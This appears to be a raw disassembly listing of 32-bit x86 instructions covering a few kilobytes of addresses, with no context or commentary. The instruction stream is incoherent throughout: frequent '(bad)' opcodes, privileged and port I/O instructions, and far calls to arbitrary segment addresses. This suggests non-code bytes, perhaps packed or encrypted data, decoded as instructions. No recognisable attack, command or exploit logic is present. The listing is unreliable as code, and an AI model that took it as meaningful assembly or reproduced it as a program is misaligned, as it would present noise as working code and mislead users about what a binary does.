  40f53f:	mov    dl,0xb5
  40f541:	cs cwde 
  40f543:	pusha  
  40f544:	sbb    DWORD PTR [ebx],ebp
  40f546:	pop    ebp
  40f547:	test   BYTE PTR [eax],ch
  40f549:	pop    edi
  40f54a:	arpl   WORD PTR [esp+eiz*8+0x7f],ax
  40f54e:	push   ebp
  40f54f:	(bad)  
  40f550:	mov    eax,ds:0x60cb3198
  40f555:	hlt    
  40f556:	xor    DWORD PTR [ecx+0x4d],edi
  40f559:	mov    esi,DWORD PTR [ecx+0x5f86879]
  40f55f:	ficomp DWORD PTR [eax-0x72]
  40f562:	jno    0x40f530
  40f564:	pusha  
  40f565:	mov    ah,0xf3
  40f567:	sub    eax,0xd7599a02
  40f56c:	into   
  40f56d:	(bad)
  40f571:	mov    BYTE PTR [esi],bh
  40f573:	clc    
  40f574:	pop    ebp
  40f575:	push   ss
  40f576:	neg    BYTE PTR [edi-0x5eda78ea]
  40f57c:	sbb    BYTE PTR [eax],0x29
  40f57f:	test   BYTE PTR [eax-0x7f],ch
  40f582:	cwde   
  40f583:	rsqrtps xmm7,XMMWORD PTR [ecx+ebp*8+0x49]
  40f588:	js     0x40f58b
  40f58a:	add    BYTE PTR [edi],0xf4
  40f58d:	loope  0x40f60e
  40f58f:	push   esp
  40f590:	scas   al,BYTE PTR es:[edi]
  40f591:	push   esp
  40f592:	clc    
  40f593:	(bad)  
  40f595:	and    BYTE PTR [ecx+0x24a3ed9c],0xcc
  40f59c:	daa    
  40f59d:	shl    DWORD PTR [ebp-0x5bb1a3a5],cl
  40f5a3:	stc    
  40f5a4:	jns    0x40f60a
  40f5a6:	int3   
  40f5a7:	cmp    al,0xe9
  40f5a9:	sbb    ch,BYTE PTR [ecx-0x63]
  40f5ac:	lods   al,BYTE PTR ds:[esi]
  40f5ad:	ficomp DWORD PTR [eax+eax*8]
  40f5b0:	mov    eax,0x2ab33f6a
  40f5b5:	mov    edi,DWORD PTR [ebx]
  40f5b7:	jecxz  0x40f5eb
  40f5b9:	lock sub BYTE PTR [edi+0x775b38d],al
  40f5c0:	out    0x1a,al
  40f5c2:	cdq    
  40f5c3:	arpl   WORD PTR [edx],di
  40f5c5:	pop    edi
  40f5c6:	or     DWORD PTR [ebx+0x63],0x1f
  40f5ca:	rcl    DWORD PTR [ecx-0x43],1
  40f5cd:	ficom  WORD PTR [esi-0x3a]
  40f5d0:	jmp    FWORD PTR [ebx+edx*1+0x66d94dfa]
  40f5d7:	mov    dh,0xca
  40f5d9:	out    0xbb,eax
  40f5db:	fld    QWORD PTR [esi-0x3e]
  40f5de:	sti    
  40f5df:	icebp  
  40f5e0:	cld    
  40f5e1:	outs   dx,DWORD PTR ds:[esi]
  40f5e2:	xchg   esi,eax
  40f5e3:	inc    esp
  40f5e4:	cmp    eax,0x5531868d
  40f5e9:	loop   0x40f614
  40f5eb:	push   edx
  40f5ec:	xchg   DWORD PTR [ecx-0x913320a],ebp
  40f5f2:	push   edi
  40f5f3:	rcl    ecx,cl
  40f5f5:	loope  0x40f5af
  40f5f7:	pop    ebp
  40f5f8:	outs   dx,BYTE PTR ds:[esi]
  40f5f9:	or     ecx,DWORD PTR [ebx-0x610b13d3]
  40f5ff:	lods   al,BYTE PTR ds:[esi]
  40f600:	enter  0x6272,0x5a
  40f604:	je     0x40f58b
  40f606:	dec    ebp
  40f607:	mov    edi,0xd1f4de86
  40f60c:	dec    edi
  40f60d:	mov    dl,0xd5
  40f60f:	aam    0x1
  40f611:	stos   BYTE PTR es:[edi],al
  40f612:	(bad)  
  40f613:	sub    DWORD PTR [edi-0x7ccf6680],edi
  40f619:	int3   
  40f61a:	push   ss
  40f61b:	gs pop edi
  40f61d:	(bad)
  40f620:	adc    cl,bh
  40f622:	sbb    DWORD PTR [eax],edx
  40f624:	aas    
  40f625:	test   al,0xe9
  40f627:	and    esi,eax
  40f629:	jg     0x40f5ca
  40f62b:	call   0xc05f:0x1c13c4a1
  40f632:	sbb    al,0x9e
  40f634:	icebp  
  40f635:	and    al,0x89
  40f637:	rcl    DWORD PTR [ebp-0x61],1
  40f63a:	outs   dx,BYTE PTR ds:[esi]
  40f63b:	jne    0x40f5e2
  40f63d:	xchg   BYTE PTR [ebp+0x6683f25d],bh
  40f643:	sti    
  40f644:	cmp    ebp,ecx
  40f646:	mov    ah,0xc1
  40f648:	cmp    al,0x1c
  40f64a:	mov    al,BYTE PTR [esi-0x1d]
  40f64d:	ret    
  40f64e:	push   ds
  40f64f:	sbb    al,0xe9
  40f651:	in     al,0x41
  40f653:	xchg   ebp,eax
  40f654:	inc    esp
  40f655:	je     0x40f69a
  40f657:	lods   eax,DWORD PTR ds:[esi]
  40f658:	in     eax,0xc6
  40f65a:	mov    bh,0x8e
  40f65c:	push   ebp
  40f65d:	loopne 0x40f67e
  40f65f:	outs   dx,DWORD PTR ss:[esi]
  40f661:	(bad)
  40f664:	sbb    al,0x39
  40f666:	adc    DWORD PTR [esi],ebx
  40f668:	leave  
  40f669:	mov    al,es:0xfd34d1d
  40f66f:	cmp    BYTE PTR [esi-0x4c],bl
  40f672:	mov    dh,0x26
  40f674:	adc    DWORD PTR [esi-0x6d],ebp
  40f677:	test   al,0x98
  40f679:	sahf   
  40f67a:	imul   ecx,edx,0xce94616c
  40f680:	hlt    
  40f681:	lock mov bl,0x37
  40f684:	(bad)  
  40f685:	and    al,BYTE PTR [esi+0x2]
  40f688:	(bad)  
  40f689:	ss pop esp
  40f68b:	push   0x9b36b892
  40f690:	and    BYTE PTR [ecx],al
  40f692:	push   esi
  40f693:	repz dec ecx
  40f695:	arpl   WORD PTR [edi-0x793cfd8c],bx
  40f69b:	mov    edi,DWORD PTR [esp+esi*8]
  40f69e:	int3   
  40f69f:	pop    ecx
  40f6a0:	std    
  40f6a1:	pop    ss
  40f6a2:	loopne 0x40f6d0
  40f6a4:	sub    dh,BYTE PTR [eax+0x63f337b7]
  40f6aa:	ret    
  40f6ab:	sahf   
  40f6ac:	in     al,0x58
  40f6ae:	cmp    al,0xc6
  40f6b0:	(bad)  
  40f6b1:	in     al,0x32
  40f6b3:	sbb    al,0xa5
  40f6b5:	fmul   QWORD PTR [edi-0x63]
  40f6b8:	pop    es
  40f6b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6ba:	(bad)  
  40f6bb:	mov    dh,0x66
  40f6bd:	es into 
  40f6bf:	mov    esi,0x7d566b22
  40f6c4:	stos   DWORD PTR es:[edi],eax
  40f6c5:	mov    al,ds:0x70a48883
  40f6ca:	dec    ebx
  40f6cb:	in     eax,0x16
  40f6cd:	es stos BYTE PTR es:[edi],al
  40f6cf:	shl    dl,cl
  40f6d1:	add    eax,0xee006399
  40f6d6:	int3   
  40f6d7:	in     al,dx
  40f6d8:	sub    DWORD PTR [eax+0x17b6cd5f],0xfadbc5e2
  40f6e2:	aad    0x1d
  40f6e4:	xor    ecx,ebx
  40f6e6:	lock jmp 0x844f:0x3788f526
  40f6ee:	xchg   edi,eax
  40f6ef:	or     DWORD PTR [esi-0x1b],edx
  40f6f2:	adc    DWORD PTR [ebx],edx
  40f6f4:	sub    al,0xba
  40f6f6:	popf   
  40f6f7:	(bad)  
  40f6f8:	dec    edx
  40f6f9:	cmp    eax,0x28245278
  40f6fe:	out    dx,eax
  40f6ff:	xor    bh,al
  40f701:	cmp    al,0x47
  40f703:	add    dh,0x95
  40f706:	outs   dx,DWORD PTR ds:[esi]
  40f707:	ins    BYTE PTR es:[edi],dx
  40f708:	stos   BYTE PTR es:[edi],al
  40f709:	in     eax,0xa0
  40f70b:	inc    ebp
  40f70c:	push   esp
  40f70d:	adc    al,BYTE PTR [ebx-0x6d]
  40f710:	pop    ds
  40f711:	inc    ecx
  40f712:	xchg   esp,eax
  40f713:	in     al,dx
  40f714:	fld    TBYTE PTR [ecx+ebx*1-0x15dd274f]
  40f71b:	lahf   
  40f71c:	sbb    DWORD PTR cs:[ecx],edi
  40f71f:	sub    eax,DWORD PTR [ebx-0x6fe75847]
  40f725:	push   edx
  40f726:	mov    dh,0xed
  40f728:	mul    DWORD PTR [esi-0x49]
  40f72b:	shr    DWORD PTR [edx+0x1c],cl
  40f72e:	jg     0x40f77e
  40f730:	cld    
  40f731:	add    edi,ecx
  40f733:	sub    ecx,DWORD PTR [esi+0xc]
  40f736:	lds    esi,FWORD PTR [eax+0x5b4f1476]
  40f73c:	pop    eax
  40f73d:	sti    
  40f73e:	mov    ebp,0x3a999748
  40f743:	adc    eax,0x7476c548
  40f748:	mov    al,ds:0x3b0919ac
  40f74d:	sbb    ch,BYTE PTR [edi]
  40f74f:	imul   edx,DWORD PTR [ecx-0x7cff6a75],0x4d
  40f756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f757:	inc    ebx
  40f758:	loop   0x40f75e
  40f75a:	sub    eax,0xad3bb992
  40f75f:	ss pop ss
  40f761:	sti    
  40f762:	iret   
  40f763:	push   cs
  40f764:	mov    bl,0xfe
  40f766:	pop    es
  40f767:	fcomp  DWORD PTR [edx]
  40f769:	and    al,0x78
  40f76b:	sbb    BYTE PTR [ecx+0x7d],dh
  40f76e:	fcom   st(6)
  40f770:	ficomp WORD PTR [edx-0x5e]
  40f773:	(bad)  
  40f774:	cmp    al,0x7c
  40f776:	test   BYTE PTR [esi-0x76],al
  40f779:	out    0x79,al
  40f77b:	sbb    al,0xb6
  40f77d:	jecxz  0x40f749
  40f77f:	bound  ecx,QWORD PTR [edi-0x5]
  40f782:	sbb    ah,BYTE PTR [edx+0x47]
  40f785:	and    DWORD PTR [edi],esi
  40f787:	jmp    0x1ae8be7c
  40f78c:	add    cl,bl
  40f78e:	lds    eax,FWORD PTR [edx]
  40f790:	push   es
  40f791:	div    eax
  40f793:	dec    eax
  40f794:	xor    eax,0x923fbe02
  40f799:	out    0x72,eax
  40f79b:	fidivr DWORD PTR [ebp+0x778493ea]
  40f7a1:	xchg   edi,eax
  40f7a2:	jmp    0x1e57:0x7f71cd04
  40f7a9:	add    DWORD PTR [esi-0x35],ecx
  40f7ac:	sbb    DWORD PTR [ecx+0x575f5b7e],edi
  40f7b2:	call   0xb3933e03
  40f7b7:	push   cs
  40f7b8:	fcmovu st,st(2)
  40f7ba:	das    
  40f7bb:	int3   
  40f7bc:	push   cs
  40f7bd:	inc    ebx
  40f7be:	xor    BYTE PTR [edi+0x3b417743],0xf5
  40f7c5:	adc    eax,0x8fa74ddb
  40f7ca:	(bad)  
  40f7cb:	fs xchg ecx,eax
  40f7cd:	out    0x20,al
  40f7cf:	or     ah,BYTE PTR [esi+0x5394ab6c]
  40f7d5:	dec    esi
  40f7d6:	or     BYTE PTR [eax-0x58],cl
  40f7d9:	fsubrp st(4),st
  40f7dc:	inc    edx
  40f7dd:	xchg   BYTE PTR [esi-0x1374e721],ch
  40f7e3:	sbb    dh,cl
  40f7e5:	shl    ah,0xa4
  40f7e8:	retf   
  40f7e9:	and    al,0xb2
  40f7eb:	test   DWORD PTR [ebx-0x5171c18c],ecx
  40f7f1:	xor    cl,dh
  40f7f3:	mov    ebx,cs
  40f7f5:	and    al,0x9
  40f7f7:	aam    0x93
  40f7f9:	loopne 0x40f814
  40f7fb:	xor    BYTE PTR ss:[ecx+edi*4+0x14151a18],0x4b
  40f804:	cmp    al,0x2d
  40f806:	add    ah,BYTE PTR ds:0x7ae64d20
  40f80c:	pusha  
  40f80d:	mov    DWORD PTR [edi+esi*4-0x34],0x6c10ce75
  40f815:	fwait
  40f816:	stc    
  40f817:	add    al,0xef
  40f819:	rcr    DWORD PTR [edx],0x7b
  40f81c:	clc    
  40f81d:	sub    esp,DWORD PTR [ebx-0x74]
  40f820:	push   eax
  40f821:	enter  0x817f,0x45
  40f825:	add    eax,0xde89a7aa
  40f82a:	push   eax
  40f82b:	adc    ch,BYTE PTR [eax+0x3b]
  40f82e:	shl    DWORD PTR [ebp-0x33],1
  40f831:	popa   
  40f832:	or     eax,0xf122f8a5
  40f837:	jno    0x40f7d6
  40f839:	test   al,0xe7
  40f83b:	clc    
  40f83c:	xchg   ebx,eax
  40f83d:	pop    DWORD PTR [ebx+0x5d]
  40f840:	adc    ebp,DWORD PTR [ebp-0x72]
  40f843:	test   eax,0x6c2f3fee
  40f848:	sahf   
  40f849:	jbe    0x40f867
  40f84b:	rcpps  xmm6,XMMWORD PTR [eax+eax*2+0x27]
  40f850:	xchg   DWORD PTR [ecx-0x27],ebp
  40f853:	jl     0x40f8b1
  40f855:	nop
  40f856:	jae    0x40f8bf
  40f858:	call   DWORD PTR [edx]
  40f85a:	dec    ecx
  40f85b:	pop    esp
  40f85c:	or     DWORD PTR [edi+0x58],ebp
  40f85f:	mov    edi,0x5d97f24
  40f864:	test   al,0xb5
  40f866:	dec    ebx
  40f867:	mov    cl,0x84
  40f869:	lods   al,BYTE PTR ds:[esi]
  40f86a:	ds push edi
  40f86c:	adc    ecx,0xffffffe4
  40f86f:	mov    ecx,0x8a652610
  40f874:	push   ss
  40f875:	mov    dh,BYTE PTR [edi+0x1d]
  40f878:	xlat   BYTE PTR ds:[ebx]
  40f879:	mov    al,ds:0x6d8f6c80
  40f87e:	shl    BYTE PTR [ecx+0x532b515f],cl
  40f884:	sub    cl,ch
  40f886:	in     al,dx
  40f887:	xchg   al,cl
  40f889:	xchg   esi,eax
  40f88a:	pop    ebp
  40f88b:	push   es
  40f88c:	sub    ebx,DWORD PTR [ebx+edi*2]
  40f88f:	call   0xcbc2:0x5779ddb0
  40f896:	ret    
  40f897:	fbstp  TBYTE PTR [eax-0x2ebff885]
  40f89d:	enter  0xa130,0x66
  40f8a1:	dec    ebp
  40f8a2:	sub    bl,BYTE PTR [edx-0x12722c67]
  40f8a8:	sub    BYTE PTR [edi],dh
  40f8aa:	aam    0x57
  40f8ac:	(bad)  
  40f8ad:	jb     0x40f8fc
  40f8af:	adc    eax,0x633e17a0
  40f8b4:	or     ah,al
  40f8b6:	imul   esi,eax,0xffffffc1
  40f8b9:	mov    ah,0x36
  40f8bb:	lods   eax,DWORD PTR ds:[esi]
  40f8bc:	mov    bh,0x5a
  40f8be:	ja     0x40f8d5
  40f8c0:	xor    al,0x5f
  40f8c2:	xchg   ecx,eax
  40f8c3:	pop    es
  40f8c4:	pop    esi
  40f8c5:	xor    BYTE PTR [eax+0x21],bh
  40f8c8:	xor    al,0xf0
  40f8ca:	dec    esi
  40f8cb:	mov    esp,0x594cb804
  40f8d0:	add    al,0x20
  40f8d2:	push   edi
  40f8d3:	cmp    DWORD PTR [ecx-0x19],ecx
  40f8d6:	mov    ch,0x72
  40f8d8:	xchg   BYTE PTR [eax-0x78],dh
  40f8db:	adc    DWORD PTR [esi+eiz*4],esi
  40f8de:	cwde   
  40f8df:	hlt    
  40f8e0:	call   0xef5c:0x168c749d
  40f8e7:	test   DWORD PTR [edx+ebx*8-0x5b],0xe643b3e2
  40f8ef:	push   ebx
  40f8f0:	fwait
  40f8f1:	inc    esp
  40f8f2:	aad    0xd8
  40f8f4:	das    
  40f8f5:	adc    BYTE PTR [ecx-0x79],0xf4
  40f8f9:	fnstcw WORD PTR [ebp-0x11]
  40f8fc:	hlt    
  40f8fd:	cwde   
  40f8fe:	adc    eax,0x9024f76
  40f903:	sbb    eax,0xa6599144
  40f908:	scas   eax,DWORD PTR es:[edi]
  40f909:	adc    BYTE PTR [edi-0x243ab1f6],cl
  40f90f:	and    eax,0x39702f3f
  40f914:	adc    al,0xf4
  40f916:	jp     0x40f98c
  40f918:	adc    al,0x15
  40f91a:	mov    WORD PTR [eax+eiz*8-0x1a],ss
  40f91e:	mov    bh,0x8a
  40f920:	inc    ebp
  40f921:	push   eax
  40f922:	shl    DWORD PTR [edi-0xa],1
  40f925:	sar    eax,0x75
  40f928:	adc    eax,esi
  40f92a:	pop    edx
  40f92b:	and    DWORD PTR [ecx-0x152fe42],0xffffffbf
  40f932:	push   edi
  40f933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f934:	mov    al,0x94
  40f936:	or     eax,0xe70af67c
  40f93b:	inc    esp
  40f93c:	ret    
  40f93d:	cmp    ecx,DWORD PTR [edi]
  40f93f:	sar    DWORD PTR [edi],1
  40f941:	jge    0x40f8e8
  40f943:	pusha  
  40f944:	idiv   DWORD PTR [ebp+0x3e0f40ef]
  40f94a:	outs   dx,DWORD PTR ds:[esi]
  40f94b:	arpl   WORD PTR ds:0xce9245e,bp
  40f951:	mov    ebx,0x3093b4f9
  40f956:	jbe    0x40f978
  40f958:	or     al,0xc7
  40f95a:	mov    DWORD PTR [ebx+eiz*8+0x6a],edx
  40f95e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f95f:	add    al,0x28
  40f961:	dec    edx
  40f962:	std    
  40f963:	pop    esp
  40f964:	xor    eax,0xd3d41c92
  40f969:	mov    ebx,0x291391dc
  40f96e:	xchg   BYTE PTR [edx],bh
  40f970:	mov    bl,0x99
  40f972:	add    al,0xd9
  40f974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f975:	jle    0x40f8fe
  40f977:	pop    ebx
  40f978:	and    BYTE PTR [eax-0x45],0x8c
  40f97c:	rol    DWORD PTR [edi+0x6e5049b6],1
  40f982:	sub    DWORD PTR [ecx-0x67406186],eax
  40f988:	scas   al,BYTE PTR es:[edi]
  40f989:	mov    ds:0xefb9b8f0,al
  40f98e:	call   0xcaeb:0x8e0beaf1
  40f995:	(bad)  
  40f996:	push   edx
  40f997:	or     BYTE PTR [eax],bh
  40f999:	sahf   
  40f99a:	test   DWORD PTR [edi-0x244f4dac],0xf12f44f5
  40f9a4:	inc    edx
  40f9a5:	xchg   edi,eax
  40f9a6:	jne    0x40f993
  40f9a8:	pop    esp
  40f9a9:	int3   
  40f9aa:	push   eax
  40f9ab:	(bad)  
  40f9ac:	cli    
  40f9ad:	jmp    0x40f948
  40f9af:	add    DWORD PTR ss:[esi+0x37fa31e6],ebp
  40f9b6:	les    edx,FWORD PTR [eax]
  40f9b8:	lods   eax,DWORD PTR ds:[esi]
  40f9b9:	imul   DWORD PTR [ebp-0x28]
  40f9bc:	aas    
  40f9bd:	sub    eax,0x1d78d22d
  40f9c2:	xchg   ebp,esi
  40f9c4:	int    0x51
  40f9c6:	retf   0x52c0
  40f9c9:	pop    es
  40f9ca:	add    cl,BYTE PTR [ebp+0x54e8a81c]
  40f9d0:	(bad)  
  40f9d1:	pop    edi
  40f9d2:	mov    ch,BYTE PTR [eax]
  40f9d4:	sub    BYTE PTR [ecx-0x4c],ch
  40f9d7:	pop    ss
  40f9d8:	mov    ecx,0x3a22bb2d
  40f9dd:	nop
  40f9de:	push   ss
  40f9df:	adc    ebx,DWORD PTR [esp+esi*4-0x2e]
  40f9e3:	jnp    0x40f997
  40f9e5:	cli    
  40f9e6:	popa   
  40f9e7:	inc    edx
  40f9e8:	push   ss
  40f9e9:	lahf   
  40f9ea:	cmp    cl,BYTE PTR [edi+0x1a]
  40f9ed:	adc    BYTE PTR [esp+eax*4],bh
  40f9f0:	or     eax,0xf1a1e7fc
  40f9f5:	mov    ebx,0x8edb5e22
  40f9fa:	(bad)  
  40f9fb:	mov    eax,ds:0xecf8916d
  40fa00:	sbb    DWORD PTR [edx+ebx*4],ebp
  40fa03:	sbb    ebp,DWORD PTR [ecx]
  40fa05:	in     al,0xdb
  40fa07:	call   DWORD PTR [ebp-0x2da15ece]
  40fa0d:	cwde   
  40fa0e:	mov    eax,ds:0x797292ce
  40fa13:	sub    BYTE PTR [edi+ebp*8-0x130fae9],ah
  40fa1a:	inc    esi
  40fa1b:	mov    WORD PTR [eax-0x2b],cs
  40fa1e:	scas   al,BYTE PTR es:[edi]
  40fa1f:	xor    bh,BYTE PTR [eax]
  40fa21:	outs   dx,DWORD PTR ds:[esi]
  40fa22:	mov    DWORD PTR [edx+edx*8-0x2],0x2e044cec
  40fa2a:	std    
  40fa2b:	push   ds
  40fa2c:	iret   
  40fa2d:	bnd je 0x40fa5b
  40fa30:	(bad)  
  40fa31:	or     DWORD PTR [edi+0x4a],edx
  40fa34:	lods   al,BYTE PTR ds:[esi]
  40fa35:	inc    esp
  40fa36:	nop
  40fa37:	pop    edx
  40fa38:	or     dh,ch
  40fa3a:	cmp    eax,0xebd89f96
  40fa3f:	inc    esi
  40fa40:	xchg   ebp,eax
  40fa41:	and    DWORD PTR [edi+0x15],ebp
  40fa44:	mov    edi,0xf4c4edd9
  40fa49:	ins    BYTE PTR es:[edi],dx
  40fa4a:	sub    al,0x51
  40fa4c:	inc    eax
  40fa4d:	adc    BYTE PTR [eax+0x48],al
  40fa50:	mov    bh,0x36
  40fa52:	cmp    dh,al
  40fa54:	and    al,0x8b
  40fa56:	mov    edx,0xf90ac996
  40fa5b:	popa   
  40fa5c:	rol    edx,1
  40fa5e:	fist   DWORD PTR [edx-0x48bb6645]
  40fa64:	push   ecx
  40fa65:	pop    edx
  40fa66:	shl    BYTE PTR [esi-0x79523d2d],1
  40fa6c:	sub    al,0xbc
  40fa6e:	adc    dl,BYTE PTR [edx+ebp*4]
  40fa71:	inc    eax
  40fa72:	ins    DWORD PTR es:[edi],dx
  40fa73:	pop    edi
  40fa74:	pop    ebp
  40fa75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa76:	add    BYTE PTR [edx+0x675138aa],al
  40fa7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa7d:	shl    DWORD PTR [ecx-0x70],0xe9
  40fa81:	dec    edx
  40fa82:	(bad)  
  40fa83:	test   eax,0x9551e7f5
  40fa88:	into   
  40fa89:	ins    BYTE PTR es:[edi],dx
  40fa8a:	adc    edi,DWORD PTR [edx-0x2b7968b8]
  40fa90:	jns    0x40fb0c
  40fa92:	pop    esi
  40fa93:	add    DWORD PTR [edi+0x69],ebp
  40fa96:	push   eax
  40fa97:	mov    dh,0x85
  40fa99:	inc    eax
  40fa9a:	mov    DWORD PTR [edx+0x2869737a],eax
  40faa0:	adc    DWORD PTR [edi],esi
  40faa2:	jle    0x40fabf
  40faa4:	xchg   edi,eax
  40faa5:	cmp    cl,0x99
  40faa8:	adc    eax,0xc79c4e4c
  40faad:	fdivr  DWORD PTR [edi]
  40faaf:	dec    ebx
  40fab0:	fstp   QWORD PTR [ebp+0x6590a5cd]
  40fab6:	sbb    edi,DWORD PTR [ecx-0x546ee3b4]
  40fabc:	add    eax,0xe8fbb9f8
  40fac1:	rcl    DWORD PTR ds:0x9091aaba,0x3c
  40fac8:	add    eax,0xd38186b8
  40facd:	mov    esi,0xe58eaefb
  40fad2:	inc    ebp
  40fad3:	jmp    0x40fa6d
  40fad5:	fdivr  DWORD PTR [edx+0x3904c167]
  40fadb:	add    al,0x5c
  40fadd:	dec    edi
  40fade:	aad    0xd5
  40fae0:	add    eax,0x16870966
  40fae5:	or     ch,BYTE PTR [ebp-0x5d08eecc]
  40faeb:	xchg   esp,eax
  40faec:	in     al,0x96
  40faee:	cwde   
  40faef:	push   ds
  40faf0:	adc    al,0xc8
  40faf2:	mov    eax,DWORD PTR [esi+0x195ac21a]
  40faf8:	and    al,0x20
  40fafa:	pop    edx
  40fafb:	mov    eax,0xd1eba53d
  40fb00:	adc    al,0xf1
  40fb02:	popf   
  40fb03:	push   0xffffff8f
  40fb05:	jge    0x40fa8c
  40fb07:	jp     0x40fb10
  40fb09:	scas   al,BYTE PTR es:[edi]
  40fb0a:	clc    
  40fb0b:	clc    
  40fb0c:	push   es
  40fb0d:	stos   DWORD PTR es:[edi],eax
  40fb0e:	fsubr  QWORD PTR [ecx]
  40fb10:	mov    eax,0xaa4ef488
  40fb15:	cs (bad) 
  40fb17:	jo     0x40faab
  40fb19:	jp     0x40fac6
  40fb1b:	mov    eax,ds:0xf2e7a841
  40fb20:	lods   al,BYTE PTR ds:[esi]
  40fb21:	ret    0xe467
  40fb24:	xor    DWORD PTR [eax+edi*2+0x24],ecx
  40fb28:	push   esp
  40fb29:	clc    
  40fb2a:	rcr    cl,1
  40fb2c:	retf   
  40fb2d:	xlat   BYTE PTR ds:[ebx]
  40fb2e:	gs jle 0x40fb48
  40fb31:	adc    eax,0x3f40440b
  40fb36:	xor    al,0xc1
  40fb38:	mov    eax,ds:0xa1551115
  40fb3d:	adc    eax,0xa8146cf0
  40fb42:	sti    
  40fb43:	mov    ah,0x1f
  40fb45:	sub    dl,BYTE PTR [ecx-0x47]
  40fb48:	pop    ebp
  40fb49:	inc    esi
  40fb4a:	mov    al,ds:0x42be83b8
  40fb4f:	mov    ch,0xd6
  40fb51:	loopne 0x40fba7
  40fb53:	jns    0x40fb8a
  40fb55:	inc    ebx
  40fb56:	mov    eax,0xfc34e485
  40fb5b:	xor    ecx,esi
  40fb5d:	push   cs
  40fb5e:	out    0x51,al
  40fb60:	mov    cl,0x4c
  40fb62:	stos   DWORD PTR es:[edi],eax
  40fb63:	adc    eax,0xb43b8bd3
  40fb68:	inc    ebp
  40fb69:	mov    edx,0x647bf4f4
  40fb6e:	sub    al,0x35
  40fb70:	jge    0x40fb4f
  40fb72:	inc    ebx
  40fb73:	sub    bl,dl
  40fb75:	sbb    ah,bl
  40fb77:	daa    
  40fb78:	int    0x3b
  40fb7a:	out    0x71,al
  40fb7c:	rol    al,1
  40fb7e:	repnz pop esi
  40fb80:	aaa    
  40fb81:	mov    ebp,0x3452b7a3
  40fb86:	mov    ds:0x2f5adbf0,al
  40fb8b:	into   
  40fb8c:	ret    
  40fb8d:	int3   
  40fb8e:	push   ds
  40fb8f:	push   ss
  40fb90:	dec    ebx
  40fb91:	xchg   ebp,eax
  40fb92:	mov    edi,esp
  40fb94:	push   ss
  40fb95:	out    dx,eax
  40fb96:	jns    0x40fb56
  40fb98:	(bad)  
  40fb99:	mov    al,0x4a
  40fb9b:	rol    DWORD PTR es:[ebx+eax*8+0x56f173b3],1
  40fba3:	call   0x2a46:0x8aad12a0
  40fbaa:	sub    eax,0x517d37ea
  40fbaf:	arpl   di,di
  40fbb1:	iret   
  40fbb2:	xchg   edx,eax
  40fbb3:	adc    eax,0xa08ba7c2
  40fbb8:	popa   
  40fbb9:	(bad)  
  40fbba:	lods   al,BYTE PTR ds:[esi]
  40fbbb:	mov    bl,0x96
  40fbbd:	imul   esi,DWORD PTR [esp+eax*4-0x15],0x11
  40fbc2:	mov    DWORD PTR es:[esi-0x7087874c],edx
  40fbc9:	shr    edx,0x71
  40fbcc:	fs vpperm xmm4,xmm2,xmm0,xmm3
  40fbd3:	push   ebx
  40fbd4:	sbb    dl,BYTE PTR [ecx+0x5e]
  40fbd7:	test   eax,0x99706229
  40fbdc:	adc    DWORD PTR [ecx+eiz*1+0x6d61829b],edi
  40fbe3:	ficom  WORD PTR ds:[ecx-0x1b]
  40fbe7:	shr    BYTE PTR [edi-0x61],0xca
  40fbeb:	sub    eax,0x8b3687d6
  40fbf0:	sub    BYTE PTR [esi],ah
  40fbf2:	xor    ebp,DWORD PTR [esi]
  40fbf4:	xchg   edi,eax
  40fbf5:	lea    esp,[esp+ebp*8+0x6a]
  40fbf9:	push   0x114236d1
  40fbfe:	repnz lods eax,DWORD PTR ds:[esi]
  40fc00:	mov    ebx,DWORD PTR [ebx-0x32]
  40fc03:	cmp    BYTE PTR [edi+0x581614a6],dl
  40fc09:	cmp    edx,esp
  40fc0b:	in     al,dx
  40fc0c:	cwde   
  40fc0d:	mov    cl,0x91
  40fc0f:	outs   dx,DWORD PTR ds:[esi]
  40fc10:	mov    eax,DWORD PTR [eax+ecx*1+0x53]
  40fc14:	jbe    0x40fc6b
  40fc16:	out    dx,eax
  40fc17:	jnp    0x40fc80
  40fc19:	dec    ebx
  40fc1a:	cmp    BYTE PTR [ecx],dh
  40fc1c:	rol    BYTE PTR [esi+0xe],0x18
  40fc20:	rol    BYTE PTR [edx+0x43],cl
  40fc23:	xchg   esi,eax
  40fc24:	lock jg 0x40fbc1
  40fc27:	xchg   ecx,eax
  40fc28:	clc    
  40fc29:	and    al,0x29
  40fc2b:	fldlg2 
  40fc2d:	push   edx
  40fc2e:	imul   BYTE PTR [edx+edx*1]
  40fc31:	fiadd  DWORD PTR [edi+eax*2+0xddc1014]
  40fc38:	mov    dh,0xfe
  40fc3a:	rol    BYTE PTR [ebp+0x6],1
  40fc3d:	jns    0x40fbf6
  40fc3f:	dec    eax
  40fc40:	dec    ebx
  40fc41:	mul    DWORD PTR [ebp+0x1c]
  40fc44:	repnz dec ebx
  40fc46:	cmp    DWORD PTR [ebx+0x280b7f6a],edx
  40fc4c:	jl     0x40fcc1
  40fc4e:	lahf   
  40fc4f:	sub    DWORD PTR [ebx-0xf9d2fc7],ebx
  40fc55:	out    0xcb,al
  40fc57:	and    BYTE PTR [ebx],ch
  40fc59:	test   esp,ecx
  40fc5b:	ret    0x7686
  40fc5e:	xchg   DWORD PTR [ebp+esi*2-0x5ea1f8ea],ebx
  40fc65:	repz aas 
  40fc67:	in     eax,dx
  40fc68:	(bad)  
  40fc69:	cmp    ecx,DWORD PTR [ebp-0x65]
  40fc6c:	sbb    BYTE PTR [esi-0x53],al
  40fc6f:	xor    DWORD PTR [eax+0x70],ebp
  40fc72:	or     edx,DWORD PTR [esi-0x9]
  40fc75:	adc    esi,edx
  40fc77:	dec    esi
  40fc78:	mov    dl,0x63
  40fc7a:	dec    eax
  40fc7b:	iret   
  40fc7c:	test   al,0xf8
  40fc7e:	mov    cl,0xf2
  40fc80:	inc    eax
  40fc81:	add    al,0x7b
  40fc83:	cmc    
  40fc84:	inc    edx
  40fc85:	cmc    
  40fc86:	jb     0x40fc61
  40fc88:	pop    ebp
  40fc89:	inc    edx
  40fc8a:	jp     0x40fca4
  40fc8c:	cmp    ebx,edi
  40fc8e:	das    
  40fc8f:	pop    ss
